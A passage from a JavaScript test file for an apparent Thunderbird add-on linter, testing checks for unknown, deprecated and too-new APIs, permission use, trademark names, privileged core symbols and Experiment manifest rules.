    apiUsages: [],
  };
  const out = unusedPermissionProducer.run(withManifest(ctx));
  // Both escalate now; nothing is hand-exempt.
  assert.deepEqual(
    out.escalations.map((e) => e.item),
    ["unlimitedStorage", "tabs"]
  );
  assert.deepEqual(
    notes.find((n) => n.item === "unlimitedStorage"),
    {
      item: "unlimitedStorage",
      verdict: VERDICT.UNSURE,
    }
  );
});

// ---- deprecated-api ----
// A deprecated API's hint is the schema's own deprecation message (the migration
// note), not a link to the deprecated item. A "too new" API (version_added beyond
// the supported range) is NOT deprecated-api's concern - it belongs to the
// strict-min/strict-max-version-api checks, so deprecated-api ignores it.
test("deprecated-api hint is the schema deprecation message, not a doc link", () => {
  const ctx = {
    schema,
    addon: {
      manifest: { background: { scripts: ["bg.js"] } },
      files: new Map([["bg.js", Buffer.from("")]]),
    },
    apiUsages: [
      {
        file: "bg.js",
        usages: [
          { segments: ["messages", "oldOne"], line: 1, column: 0 },
          { segments: ["messages", "future"], line: 2, column: 0 },
        ],
      },
    ],
  };
  const out = deprecatedApi.run(withManifest(ctx)).findings;
  const old = out.find((f) => f.item === "messages.oldOne");
  assert.equal(old.hint, "Use list() instead."); // schema message, not a URL
  // messages.future is "too new", not deprecated -> deprecated-api ignores it.
  assert.equal(
    out.some((f) => f.item === "messages.future"),
    false
  );
});

// ---- unknown-api: version_added:false is unsupported ----
// The schemas carry no `unsupported` key; a documented-but-unavailable Firefox
// API is marked `version_added: false`. unknown-api must flag it (and only it).
test("unknown-api flags version_added:false as unsupported", () => {
  const local = buildSchemaIndex({
    files: {
      t: [
        {
          namespace: "t",
          functions: [
            { name: "gone", annotations: [{ version_added: false }] },
            { name: "ok", annotations: [{ version_added: "60" }] },
          ],
        },
      ],
    },
  });
  assert.equal(
    SchemaIndex.isUnsupported(local.resolveApi(["t", "gone"]).def),
    true
  );
  const ctx = {
    schema: local,
    addon: {
      manifest: { background: { scripts: ["bg.js"] } },
      files: new Map([["bg.js", Buffer.from("")]]),
    },
    apiUsages: [
      {
        file: "bg.js",
        usages: [
          { root: "browser", segments: ["t", "gone"], line: 1, column: 0 },
          { root: "browser", segments: ["t", "ok"], line: 2, column: 0 },
        ],
      },
    ],
  };
  const out = unknownApi.run(withManifest(ctx));
  assert.deepEqual(out.findings, []);
  assert.equal(out.escalations.length, 1);
  assert.equal(out.escalations[0].item, "browser.t.gone");
});

// Every unavailable API is a question for a reader, whatever the surrounding code looks
// like: the check locates, it does not judge. EVERY reference is listed, including a
// second use of a name already listed - what a reader settles is whether the add-on copes
// at that line, so a clear granted where they looked must not cover a site they never
// saw. Nothing becomes a finding, so no add-on is rejected on a reading of its control
// flow.
test("unknown-api escalates every unavailable reference", () => {
  const local = buildSchemaIndex({
    files: {
      t: [
        {
          namespace: "t",
          functions: [
            { name: "gone", annotations: [{ version_added: false }] },
            { name: "ok", annotations: [{ version_added: "60" }] },
          ],
        },
      ],
    },
  });
  const g = (segments, line) => ({
    root: "browser",
    segments,
    line,
    column: 0,
  });
  const ctx = withManifest({
    schema: local,
    addon: {
      manifest: { background: { scripts: ["bg.js"] } },
      files: new Map([["bg.js", Buffer.from("")]]),
    },
    apiUsages: [
      {
        file: "bg.js",
        usages: [
          g(["t", "gone"], 1), // unsupported
          g(["t", "nope"], 2), // unknown member
          g(["nope", "x"], 3), // unknown namespace
          g(["t", "gone"], 4), // the same api, a second site to look at
        ],
      },
    ],
  });
  const out = unknownApi.run(ctx);
  assert.deepEqual(out.findings, []);
  // Line 4 names line 1's api, and is listed: the fallback covering line 1 need not
  // cover line 4, and nobody can tell without being shown it.
  assert.deepEqual(
    out.escalations.map((e) => `${e.loc.line}:${e.item}`),
    [
      "1:browser.t.gone",
      "2:browser.t.nope",
      "3:browser.nope",
      "4:browser.t.gone",
    ]
  );
});

// The cross-browser shim (browser.menus ?? browser.contextMenus) is a reader's question
// like any other. It used to be settled here, by reading the other arm of the
// short-circuit - which is the same silent clear this check no longer makes anywhere. An
// LLM reads a shim without help, and the one that turns out not to be a shim is exactly
// the case a reader is needed for.
test("unknown-api escalates a shim rather than settling it", () => {
  const usage = (segments, line) => ({
    root: "browser",
    segments,
    line,
    column: 0,
  });
  const out = unknownApi.run(
    withManifest({
      schema, // `messages` is a real namespace; `nope`/`alsoNope` are not
      addon: {
        manifest: { background: { scripts: ["bg.js"] } },
        files: new Map([["bg.js", Buffer.from("")]]),
      },
      apiUsages: [
        {
          file: "bg.js",
          usages: [
            // browser.messages ?? browser.nope - the shim shape.
            usage(["nope", "x"], 1),
            usage(["alsoNope", "x"], 2),
            usage(["stillNope", "x"], 3),
          ],
        },
      ],
    })
  );
  assert.deepEqual(out.findings, []);
  assert.deepEqual(
    out.escalations.map((e) => `${e.loc.line}:${e.item}`),
    ["1:browser.nope", "2:browser.alsoNope", "3:browser.stillNope"]
  );
});

// End-to-end through the real parser: a name the schema does not have reaches a reader
// whatever surrounds it. These shapes used to be partitioned - the first three settled as
// shims, the rest rejected - and the partition is what produced both failure directions.
// Now the report says the same thing about all of them, and none of them rejects.
test("unknown-api: every shape around an absent namespace escalates, none rejects", () => {
  const run = (src) => {
    const { usages } = parseApiUsage(src);
    const out = unknownApi.run(
      withManifest({
        schema, // `messages` is a real namespace; `nope` is not
        addon: {
          manifest: { background: { scripts: ["bg.js"] } },
          files: new Map([["bg.js", Buffer.from(src)]]),
        },
        apiUsages: [{ file: "bg.js", usages }],
      })
    );
    assert.deepEqual(out.findings, [], src);
    return out.escalations.map((e) => e.item);
  };
  for (const src of [
    `const m = browser.messages ?? browser.nope;`,
    `const m = browser.nope ?? browser.messages;`,
    `const m = browser.messages || browser.nope;`,
    `if (browser.messages) { browser.nope.x(); }`,
    `browser.messages && browser.nope.x();`,
    `browser.nope.x() || browser.messages.list();`,
  ]) {
    assert.deepEqual(run(src), ["browser.nope"], src);
  }
  // A version gate is not special either. This fixture's schema has no
  // runtime.getBrowserInfo, so the gate itself names an absent member - raised on its
  // own account rather than treated as something that vouches for what follows.
  assert.deepEqual(
    run(`if (browser.runtime.getBrowserInfo()) { browser.nope.x(); }`),
    ["browser.runtime.getBrowserInfo", "browser.nope"]
  );
});

// End-to-end, the markdown_here shape: feature detection written as a guard clause,
// parsed for real. The too-new API must be handed to judgement rather than rejecting
// the add-on - the point of the whole change.
test("a too-new API is a judgement whether or not it looks guarded", () => {
  const src =
    `async function f(id){ if (messenger.messages?.future === undefined) { return null }\n` +
    ` return await messenger.messages.future(id) }`;
  const { usages } = parseApiUsage(src);
  const out = strictMinVersionApi.run(withManifest(minCtx("60.0", usages)));
  assert.deepEqual(out.findings, []); // not a rejection
  // Two references: the existence test and the call it protects. Both are listed,
  // because nothing here reads one as a guard for the other - and a reader seeing the
  // detection on the line above the call is seeing exactly what settles it.
  assert.equal(out.escalations.length, 2);
  // And the bare call is the SAME question, not a rejection: whether a call is protected
  // is what the reader decides, so the check must not answer it either way. This is the
  // assertion that pins the routing rather than any detector.
  const bare = strictMinVersionApi.run(
    withManifest(
      minCtx("60.0", parseApiUsage(`messenger.messages.future(1);`).usages)
    )
  );
  assert.deepEqual(bare.findings, []);
  assert.equal(bare.escalations.length, 1);
});

// End-to-end (the thinbox folders shape): a namespace captured into a local, then a call
// to a non-existent member behind an if. The alias must resolve, otherwise the member is
// invisible to the check entirely - and both references are listed, the test and the call.
test("unknown-api: an aliased unknown member is listed at each site", () => {
  const src = `const m = browser.messages; if (m.nope) m.nope();`;
  const { usages } = parseApiUsage(src);
  const out = unknownApi.run(
    withManifest({
      schema, // messages is a known namespace; messages.nope is an unknown member
      addon: {
        manifest: { background: { scripts: ["bg.js"] } },
        files: new Map([["bg.js", Buffer.from(src)]]),
      },
      apiUsages: [{ file: "bg.js", usages }],
    })
  );
  assert.deepEqual(out.findings, []);
  assert.deepEqual(
    out.escalations.map((e) => e.item),
    ["browser.messages.nope", "browser.messages.nope"]
  );
});

// ---- api-resolution: the shared usage resolution ----
// resolveApiUsages resolves each reachable, non-bare browser.* usage once;
// unknownApis is the subset the schema does not recognize (what unknown-api flags).
test("resolveApiUsages resolves reachable usages once; unknownApis is the unrecognized subset", () => {
  const local = buildSchemaIndex({
    files: {
      t: [
        {
          namespace: "t",
          functions: [{ name: "ok", annotations: [{ version_added: "60" }] }],
        },
      ],
    },
  });
  const ctx = withManifest({
    schema: local,
    addon: {
      manifest: { background: { scripts: ["bg.js"] } },
      files: new Map([
        ["bg.js", Buffer.from("")],
        ["orphan.js", Buffer.from("")], // present but reached from no entry point
      ]),
    },
    apiUsages: [
      {
        file: "bg.js",
        usages: [
          { root: "browser", segments: ["mystery"], line: 1, column: 0 }, // unknown ns
          { root: "browser", segments: ["t", "ok"], line: 2, column: 0 }, // known
          { root: "browser", segments: [], line: 3, column: 0 }, // bare browser - dropped
        ],
      },
      {
        // An unreachable file: its usages are outside the pure-WebExtension tree, so
        // they must not appear in the resolution at all.
        file: "orphan.js",
        usages: [{ root: "browser", segments: ["ghost"], line: 1, column: 0 }],
      },
    ],
  });
  const resolved = resolveApiUsages(ctx);
  assert.equal(resolved.length, 2); // bg.js's 2 non-bare usages; bare + unreachable dropped
  assert.ok(
    !resolved.some((u) => u.file === "orphan.js"),
    "an unreachable file's usages are excluded"
  );
  const unknown = unknownApis(ctx);
  assert.equal(unknown.length, 1); // only browser.mystery (ghost is unreachable)
  assert.equal(unknown[0].usage.segments[0], "mystery");
});

// ---- strict-max-version-api ----
// version_added beyond the declared strict_max_version: no supported install has
// the API. Major-granularity compare (strict_max is conventionally "N.*").
const maxCtx = (max, usages) => ({
  schema,
  addon: {
    // bg.js must be in the pure WebExtension tree for the validators to check it.
    files: new Map([["bg.js", Buffer.from("")]]),
    manifest: {
      background: { scripts: ["bg.js"] },
      ...(max
        ? { browser_specific_settings: { gecko: { strict_max_version: max } } }
        : {}),
    },
  },
  apiUsages: [{ file: "bg.js", usages }],
});

test("strict-max-version-api flags an API added after strict_max_version", () => {
  const out = strictMaxVersionApi.run(
    withManifest(
      maxCtx("140.*", [
        {
          root: "messenger",
          segments: ["messages", "future"],
          line: 12,
          column: 4,
        }, // va 200
        {
          root: "messenger",
          segments: ["messages", "list"],
          line: 13,
          column: 4,
        }, // va 66
      ])
    )
  ).findings;
  assert.equal(out.length, 1);
  assert.equal(out[0].item, "messenger.messages.future()");
  assert.equal(out[0].hint, "added in Thunderbird 200");
  assert.equal(out[0].data.max, "140.*");
  assert.equal(out[0].file, "bg.js");
  assert.deepEqual(out[0].loc, { line: 12, column: 4 });
});

test("strict-max-version-api passes when strict_max_version covers the API", () => {
  const out = strictMaxVersionApi.run(
    withManifest(
      maxCtx("250.*", [
        {
          root: "messenger",
          segments: ["messages", "future"],
          line: 1,
          column: 0,
        }, // 200 <= 250
      ])
    )
  ).findings;
  assert.equal(out.length, 0);
});

test("strict-max-version-api is skipped without strict_max_version", () => {
  const out = strictMaxVersionApi.run(
    withManifest(
      maxCtx(null, [
        {
          root: "messenger",
          segments: ["messages", "future"],
          line: 1,
          column: 0,
        },
      ])
    )
  ).findings;
  assert.equal(out.length, 0);
});

// ---- strict-min-version-api ----
// version_added newer than the declared strict_min_version: installs at the low
// end of the supported range lack the API. Tuple compare (minor/patch matter).
const minCtx = (min, usages) => ({
  schema,
  addon: {
    // bg.js must be in the pure WebExtension tree for the validators to check it.
    files: new Map([["bg.js", Buffer.from("")]]),
    manifest: {
      background: { scripts: ["bg.js"] },
      ...(min
        ? { browser_specific_settings: { gecko: { strict_min_version: min } } }
        : {}),
    },
  },
  apiUsages: [{ file: "bg.js", usages }],
});

test("strict-min-version-api flags APIs added after strict_min_version", () => {
  const out = strictMinVersionApi.run(
    withManifest(
      minCtx("60.0", [
        {
          root: "messenger",
          segments: ["messages", "future"],
          line: 12,
          column: 4,
        }, // va 200
        {
          root: "messenger",
          segments: ["messages", "list"],
          line: 13,
          column: 4,
        }, // va 66
      ])
    )
  );
  assert.deepEqual(out.findings, []); // this check never rejects
  assert.equal(out.escalations.length, 2); // 200 and 66 are both > 60
  const e = out.escalations.find(
    (x) => x.item === "messenger.messages.future()"
  );
  assert.equal(e.hint, "added in Thunderbird 200");
  assert.equal(e.data.min, "60.0");
  assert.equal(e.file, "bg.js");
  assert.deepEqual(e.loc, { line: 12, column: 4 });
});

test("strict-min-version-api passes when strict_min_version >= version_added", () => {
  const out = strictMinVersionApi.run(
    withManifest(
      minCtx("128.0", [
        {
          root: "messenger",
          segments: ["messages", "list"],
          line: 1,
          column: 0,
        }, // 66 <= 128
      ])
    )
  );
  assert.equal(out.findings.length, 0);
});

test("strict-min-version-api is skipped without strict_min_version", () => {
  const out = strictMinVersionApi.run(
    withManifest(
      minCtx(null, [
        {
          root: "messenger",
          segments: ["messages", "future"],
          line: 1,
          column: 0,
        },
      ])
    )
  );
  assert.equal(out.findings.length, 0);
});

test("strict-min-version-api compares minor/patch components", () => {
  const local = buildSchemaIndex({
    files: {
      t: [
        {
          namespace: "t",
          functions: [
            { name: "f", annotations: [{ version_added: "140.4.1" }] },
          ],
        },
      ],
    },
  });
  const run = (min) =>
    strictMinVersionApi.run(
      withManifest({
        schema: local,
        addon: {
          files: new Map([["bg.js", Buffer.from("")]]),
          manifest: {
            background: { scripts: ["bg.js"] },
            browser_specific_settings: { gecko: { strict_min_version: min } },
          },
        },
        apiUsages: [
          {
            file: "bg.js",
            usages: [
              { root: "browser", segments: ["t", "f"], line: 1, column: 0 },
            ],
          },
        ],
      })
    );
  assert.equal(run("140.4.0").escalations.length, 1); // 140.4.1 > 140.4.0 -> raised
  assert.equal(run("140.4.1").escalations.length, 0); // equal -> not raised
  assert.equal(run("140.5.0").escalations.length, 0); // 140.4.1 < 140.5.0 -> not raised
});

// The escalation has to carry enough for the reader to settle it without the check
// having judged anything: which API, where, when it was added, and what the add-on
// claims to support.
test("a too-new API escalates with everything needed to settle it", () => {
  const out = strictMinVersionApi.run(
    withManifest(
      minCtx("60.0", [
        {
          root: "messenger",
          segments: ["messages", "future"],
          line: 5,
          column: 2,
        }, // va 200
      ])
    )
  );
  assert.equal(out.findings.length, 0); // not a deterministic finding
  assert.equal(out.escalations.length, 1);
  // The escalation carries everything the reviewer needs to judge the guard: the
  // API, where it is called, when it was added, and the version claimed.
  const e = out.escalations[0];
  assert.equal(e.file, "bg.js");
  assert.equal(e.item, "messenger.messages.future()");
  assert.equal(e.data.min, "60.0");
  assert.match(e.hint, /added in Thunderbird/);
});

// End-to-end: a namespace captured into a local, then feature-detected and called through
// that alias. The ALIAS is what matters here - `m.future` has to resolve to
// messages.future, or the check sees nothing at all and the too-new call is invisible.
// Both references are listed, the test and the call.
test("strict-min-version-api: an aliased too-new API resolves and is listed", () => {
  const src = `const m = browser.messages; if (m.future) m.future();`;
  const { usages } = parseApiUsage(src);
  const out = strictMinVersionApi.run(
    withManifest({
      schema,
      addon: {
        files: new Map([["bg.js", Buffer.from(src)]]),
        manifest: {
          background: { scripts: ["bg.js"] },
          browser_specific_settings: { gecko: { strict_min_version: "60.0" } },
        },
      },
      apiUsages: [{ file: "bg.js", usages }],
    })
  );
  assert.equal(out.findings.length, 0); // never a hard finding
  assert.equal(out.escalations.length, 2); // the test and the call
  assert.ok(out.escalations.every((e) => /messages\.future/.test(e.item)));
});

// An API used UNGUARDED anywhere is a hard error, even if another site is guarded:
// the unguarded site wins and nothing is escalated for it.
// EVERY call site is listed, not one per api. Whether a call is kept off the versions
// lacking the API is a property of that call - a capability flag can cover one use and
// not the next - and a site nobody is shown is a site nobody can settle.
test("strict-min-version-api lists every call site of a too-new api", () => {
  const out = strictMinVersionApi.run(
    withManifest(
      minCtx("60.0", [
        {
          root: "messenger",
          segments: ["messages", "future"],
          line: 5,
          column: 2,
        },
        {
          root: "messenger",
          segments: ["messages", "future"],
          line: 9,
          column: 0,
        },
      ])
    )
  );
  assert.deepEqual(out.findings, []);
  assert.deepEqual(
    out.escalations.map((e) => e.loc.line),
    [5, 9]
  );
});

// The two checks divide the ground: strict-min only ever sees REAL, schema-resolved APIs,
// so a non-existent namespace is never its candidate and it says nothing at all.
// unknown-api owns it and raises it for a reader.
test("a non-existent namespace: strict-min ignores it, unknown-api raises it", () => {
  const usages = [
    {
      root: "messenger",
      segments: ["fake", "nope"],
      line: 1,
      column: 0,
    },
  ];
  const out = strictMinVersionApi.run(withManifest(minCtx("60.0", usages)));
  assert.deepEqual(out.findings, []);
  assert.deepEqual(out.escalations, []); // not its ground at all

  const raised = unknownApi.run(
    withManifest({
      schema,
      addon: {
        manifest: { background: { scripts: ["bg.js"] } },
        files: new Map([["bg.js", Buffer.from("")]]),
      },
      apiUsages: [{ file: "bg.js", usages }],
    })
  );
  assert.deepEqual(raised.findings, []);
  assert.equal(raised.escalations.length, 1);
  assert.match(raised.escalations[0].item, /^messenger\.fake/);
});

// ---- permission analysis: dead files are ignored ----
// A usage counts only when its file actually runs. messages.get needs
// 'messagesRead'; in a live background script that is a missing-permission
// finding, but the same call in an unreferenced (dead) file raises nothing.
const GET_USAGE = [{ segments: ["messages", "get"], line: 3, column: 0 }];

test("missing-permission ignores usages in dead (unreachable) files", () => {
  const ctx = (file) => ({
    schema,
    addon: {
      manifest: { permissions: [], background: { scripts: ["bg.js"] } },
      files: new Map([
        ["bg.js", Buffer.from("")],
        ["dead.js", Buffer.from("messenger.messages.get(1);")],
      ]),
    },
    apiUsages: [{ file, usages: GET_USAGE }],
  });
  // Live: the call sits in the background script -> messagesRead flagged missing.
  const live = missingPermission.run(withManifest(ctx("bg.js"))).findings;
  assert.ok(live.some((f) => f.item === "messagesRead"));
  // Dead: dead.js is never referenced by the manifest -> no missing finding.
  assert.equal(
    missingPermission.run(withManifest(ctx("dead.js"))).findings.length,
    0
  );
});

// The broadened alias resolution surfaces a permission reached ONLY via a captured
// namespace (previously invisible - a false negative). Parsing an aliased
// `m.archive([1])` with no declared permissions must now flag messagesMove (function
// level) + messagesRead (namespace level) as missing.
test("missing-permission fires for a permission reached only via a namespace alias", () => {
  const src = `const m = browser.messages; m.archive([1]);`;
  const { usages } = parseApiUsage(src);
  const out = missingPermission.run(
    withManifest({
      schema,
      addon: {
        manifest: { permissions: [], background: { scripts: ["bg.js"] } },
        files: new Map([["bg.js", Buffer.from(src)]]),
      },
      apiUsages: [{ file: "bg.js", usages }],
    })
  ).findings;
  const items = out.map((f) => f.item);
  assert.ok(items.includes("messagesMove"));
  assert.ok(items.includes("messagesRead"));
});

// usedPermissions records the permissions a REACHABLE call provably requires; a
// usage only in a dead file does not count (same reachability gate as above).
test("usedPermissions tracks reachable requirements, not dead-file ones", () => {
  const ctx = (file) => ({
    schema,
    addon: {
      manifest: {
        permissions: ["messagesRead"],
        background: { scripts: ["bg.js"] },
      },
      files: new Map([
        ["bg.js", Buffer.from("")],
        ["dead.js", Buffer.from("messenger.messages.get(1);")],
      ]),
    },
    apiUsages: [{ file, usages: GET_USAGE }],
  });
  assert.ok(
    getPermissionAnalysis(withManifest(ctx("bg.js"))).usedPermissions.has(
      "messagesRead"
    )
  );
  assert.ok(
    !getPermissionAnalysis(withManifest(ctx("dead.js"))).usedPermissions.has(
      "messagesRead"
    )
  );
});

// The checklist drops a declared permission a reachable call provably
// needs (messages.get -> messagesRead), escalating only the unproven ones.
test("unused-permission omits permissions a reachable call requires", () => {
  const manifest = {
    permissions: ["messagesRead", "tabs"],
    background: { scripts: ["bg.js"] },
    browser_specific_settings: { gecko: { strict_min_version: "154" } },
  };
  const ctx = {
    schema,
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
        ["bg.js", Buffer.from("messenger.messages.get(1);")],
      ]),
    },
    apiUsages: [{ file: "bg.js", usages: GET_USAGE }],
  };
  const out = unusedPermissionProducer.run(withManifest(ctx));
  // messagesRead is proven used -> not escalated; tabs has no proven need -> kept.
  assert.deepEqual(
    out.escalations.map((e) => e.item),
    ["tabs"]
  );
});

// ---- unused-permission is version-agnostic (D308076) ----
// The single producer enumerates unused permissions regardless of strict_min_version.
// The version-specific tabs wording (D308076) moved to the registry's version-bounded
// tabs permission-prompts, selected when the escalation is assembled.
const permProducerCtx = (strictMin) => {
  const manifest = {
    permissions: ["tabs"],
    ...(strictMin === undefined
      ? {}
      : {
          browser_specific_settings: {
            gecko: { strict_min_version: strictMin },
          },
        }),
  };
  return {
    schema,
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
      ]),
    },
    apiUsages: [],
  };
};

test("unused-permission enumerates regardless of strict_min_version", () => {
  for (const min of ["154", "200", "153.9", "128", undefined, "abc", "≤59"]) {
    assert.deepEqual(
      unusedPermissionProducer
        .run(withManifest(permProducerCtx(min)))
        .escalations.map((e) => e.item),
      ["tabs"],
      `min=${String(min)}`
    );
  }
});

// ---- trademark-violation (deterministic name check) ----
// Firefox/Mozilla/MZLA are never allowed in the name; Thunderbird only as the
// trailing "for Thunderbird". Matching is case-insensitive, and a __MSG__ name
// is resolved from _locales (which a deterministic check can read).
test("trademark-violation flags forbidden brands in the (resolved) name", () => {
  const ctx = (name, files = {}) => ({
    addon: {
      manifest: { manifest_version: 3, name, version: "1" },
      files: new Map(
        Object.entries(files).map(([k, v]) => [k, Buffer.from(v)])
      ),
    },
  });
  const flags = (name, files) =>
    trademarkViolation.run(withManifest(ctx(name, files))).findings.length;
  assert.equal(flags("Firefox Helper"), 1);
  assert.equal(flags("My Mozilla Thing"), 1);
  assert.equal(flags("MZLA Tools"), 1);
  assert.equal(flags("thunderbird helper"), 1); // case-insensitive
  assert.equal(flags("Calendar for Thunderbird"), 0); // allowed trailing form
  assert.equal(flags("Calendar Tool"), 0);
  // A localized __MSG__ name is resolved from _locales (and flagged).
  const locale = JSON.stringify({ extName: { message: "Firefox Sync" } });
  assert.equal(
    flags("__MSG_extName__", { "_locales/en/messages.json": locale }),
    1
  );
});

// The finding cites the manifest line of the `name` property and the offending
// (resolved) name, not a bare "manifest.json".
test("trademark-violation anchors the finding on the name line with the name", () => {
  const ctxOf = (name, files) =>
    withManifest({
      addon: {
        manifest: { manifest_version: 3, name, version: "1" },
        files: new Map(
          Object.entries(files).map(([k, v]) => [k, Buffer.from(v)])
        ),
      },
    });
  // A literal name: the line of the `name` property, and the name as the item.
  const literal = trademarkViolation.run(
    ctxOf("Firefox Helper", {
      "manifest.json":
        '{\n  "manifest_version": 3,\n  "name": "Firefox Helper"\n}\n',
    })
  ).findings;
  assert.equal(literal.length, 1);
  assert.equal(literal[0].loc.line, 3);
  assert.equal(literal[0].item, "Firefox Helper");

  // A __MSG__ name: still anchored on the manifest `name` line, but the item is the
  // resolved locale string (the actual offending name).
  const localized = trademarkViolation.run(
    ctxOf("__MSG_extName__", {
      "manifest.json": '{\n  "name": "__MSG_extName__"\n}\n',
      "_locales/en/messages.json": JSON.stringify({
        extName: { message: "Firefox Sync" },
      }),
    })
  ).findings;
  assert.equal(localized.length, 1);
  assert.equal(localized[0].loc.line, 2);
  assert.equal(localized[0].item, "Firefox Sync");
});

// ---- core-symbol-in-webext (privileged globals in pure WebExtension code) ----
// A GLOBAL reference to a core symbol (Services, ChromeUtils, Cc/Ci, ...) is flagged;
// a property of that name, an object key, and a name shadowed by a local binding or
// import are the developer's own and are exempt. (The Experiment-tree exemption is
// covered by the core-symbol-webext golden fixture, which builds real reachability.)
test("core-symbol-in-webext flags global core symbols, not locals/imports/properties", () => {
  // bg.js must be in the pure WebExtension tree to be checked, so declare it as the
  // background script and include it in the packaged files (the check gates on
  // pureWebExtensionReachable, not "every authored file").
  const run = (code) =>
    coreSymbolInWebext.run(
      withManifest({
        jsSources: parsed([{ file: "bg.js", code, lineOffset: 0 }]),
        addon: {
          manifest: { manifest_version: 3, background: { scripts: ["bg.js"] } },
          files: new Map([["bg.js", Buffer.from(code)]]),
        },
        options: {},
      })
    ).findings;
  // A bare global core reference is flagged (the root, not the property). The symbol
  // rides on `item`; the resolver surfaces it on the collapsed locus line (golden).
  assert.deepEqual(
    run(`Services.wm.getMostRecentWindow("x");`).map((f) => f.item),
    ["Services"]
  );
  assert.equal(run(`ChromeUtils.importESModule("x");`).length, 1);
  assert.equal(run(`Cc["@m/x"].getService(Ci.nsIFoo);`).length, 2); // Cc + Ci
  // Shadowed / imported / declared names are the dev's own symbol - exempt.
  assert.equal(run(`const Services = api(); Services.foo();`).length, 0);
  assert.equal(run(`import { Services } from "x"; Services.foo();`).length, 0);
  assert.equal(run(`function f(Services) { return Services.x; }`).length, 0);
  // A property or object key named like a core symbol is not a global reference.
  assert.equal(run(`obj.Services.foo(); ({ Services: 1 });`).length, 0);
  // De-duped per symbol: many uses of Services -> one finding.
  assert.equal(run(`Services.a(); Services.b(); Services.c();`).length, 1);
});

// ---- strict_max_version (Experiment vs not) ----
// Only relevant when experiments are allowed: an allowed Experiment lacking a
// strict_max_version errors; one that pins a max, a non-Experiment, and (key)
// any Experiment when experiments are NOT allowed all stay silent.
test("experiment-missing-strict-max-version flags an allowed Experiment lacking a max", () => {
  const run = (manifest) =>
    experimentMissingMax.run(
      withManifest({
        addon: { manifest },
        options: { allowExperiments: true },
      })
    ).findings;
  assert.equal(run({ experiment_apis: { a: {} } }).length, 1); // experiment, no max
  assert.equal(
    run({
      experiment_apis: { a: {} },
      browser_specific_settings: { gecko: { strict_max_version: "128.0" } },
    }).length,
    0 // experiment WITH a max -> ok
  );
  assert.equal(run({ name: "x" }).length, 0); // not an experiment -> silent
  // The check does not gate on allowExperiments: whether it runs at all is the
  // orchestrator's job (phase: default runs only for a VALID experiment - allowed
  // via the flag or a pristine upstream copy). Reached directly without the flag,
  // it still flags an experiment lacking a max.
  assert.equal(
    experimentMissingMax.run(
      withManifest({
        addon: { manifest: { experiment_apis: { a: {} } } },
        options: {},
      })
    ).findings.length,
    1
  );
});

// Every Experiment submission escalates one whole-add-on manual review (a
// locus-less reminder, no findings); a non-Experiment escalates nothing.
test("experiment-manual-review escalates one reminder for an Experiment only", () => {
  const run = (manifest) =>
    experimentManualReview.run(withManifest({ addon: { manifest } }));
  const exp = run({ experiment_apis: { a: {} } });
  assert.deepEqual(exp.findings, []);
  assert.equal(exp.escalations.length, 1);
  assert.deepEqual(exp.escalations[0], {}); // whole-add-on, no locus
  assert.deepEqual(run({ name: "x" }).escalations, []); // not an experiment
});

// experiment-unknown-api escalates a single reminder ONLY when the add-on is an
// Experiment AND calls an API the schema does not recognize (a likely schema-namespace
// typo); a non-Experiment or a clean Experiment escalates nothing.
test("experiment-unknown-api escalates only for an Experiment with unrecognized API usage", () => {
  const local = buildSchemaIndex({
    files: {
      t: [
        {
          namespace: "t",
          functions: [{ name: "ok", annotations: [{ version_added: "60" }] }],
        },
      ],
    },
  });
  const ctxFor = (manifest, seg) =>
    withManifest({
      schema: local,
      addon: {
        manifest: { ...manifest, background: { scripts: ["bg.js"] } },
        files: new Map([["bg.js", Buffer.from("")]]),
      },
      apiUsages: [
        {
          file: "bg.js",
          usages: [{ root: "browser", segments: seg, line: 1, column: 0 }],
        },
      ],
    });
  // Experiment + an unknown API -> one locus-less reminder.
  const hit = experimentUnknownApi.run(
    ctxFor({ experiment_apis: { a: {} } }, ["mystery", "call"])
  );
  assert.deepEqual(hit.findings, []);
  assert.equal(hit.escalations.length, 1);
  assert.deepEqual(hit.escalations[0], {});
  // Non-Experiment + an unknown API -> nothing (unknown-api owns it).
  assert.deepEqual(
    experimentUnknownApi.run(ctxFor({}, ["mystery", "call"])).escalations,
    []
  );
  // Experiment with only recognized APIs -> nothing.
  assert.deepEqual(
    experimentUnknownApi.run(
      ctxFor({ experiment_apis: { a: {} } }, ["t", "ok"])
    ).escalations,
    []
  );
});

// A non-Experiment that pins strict_max_version warns and surfaces the value;
// the legacy applications.gecko key counts too, and an Experiment or a missing
// max stays silent.
test("non-experiment-strict-max-version flags only a non-Experiment that pins a max", () => {
  const run = (manifest) =>
    nonExperimentMax.run(withManifest({ addon: { manifest } })).findings;
  const out = run({
    browser_specific_settings: { gecko: { strict_max_version: "128.0" } },
  });
  assert.equal(out.length, 1);
  assert.equal(out[0].item, "128.0"); // value surfaced for the {{item}} response
  // The finding anchors on the strict_max_version line of the manifest text.
  const located = nonExperimentMax.run(
    withManifest({
      addon: {
        manifest: {
          browser_specific_settings: { gecko: { strict_max_version: "128.0" } },
        },
        files: new Map([
          [
            "manifest.json",
            Buffer.from(
              '{\n  "browser_specific_settings": { "gecko": { "strict_max_version": "128.0" } }\n}\n'
            ),
          ],
        ]),
      },
    })
  ).findings;
  assert.equal(located[0].loc.line, 2);
  // Legacy applications.gecko key is also honored.
  assert.equal(
    run({ applications: { gecko: { strict_max_version: "115" } } }).length,
    1
  );
  // An Experiment with a max is the other check's concern -> silent here.
  assert.equal(
    run({
      experiment_apis: { a: {} },
      browser_specific_settings: { gecko: { strict_max_version: "128.0" } },
    }).length,
    0
  );
  assert.equal(run({ name: "x" }).length, 0); // no max -> silent
});

// With experiments disabled (the default), an Experiment errors on the
// experiment_apis manifest line; --allow-experiments silences it, and a
// non-Experiment is silent regardless.
test("experiment-not-allowed errors on the experiment_apis line unless allowed", () => {
  const ctx = (manifest, allowExperiments) => ({
    addon: {
      manifest,
      files: new Map([
        [
          "manifest.json",
          Buffer.from('{\n  "experiment_apis": { "x": {} }\n}\n'),
        ],
      ]),
    },
    options: { allowExperiments },
  });
  const out = experimentNotAllowed.run(
    withManifest(ctx({ experiment_apis: { x: {} } }, false))
  ).findings;
  assert.equal(out.length, 1);
  assert.equal(out[0].loc.line, 2); // attached to the experiment_apis line
  // --allow-experiments silences it.
  assert.equal(
    experimentNotAllowed.run(
      withManifest(ctx({ experiment_apis: { x: {} } }, true))
    ).findings.length,
    0
  );
  // Not an Experiment -> silent regardless.
  assert.equal(
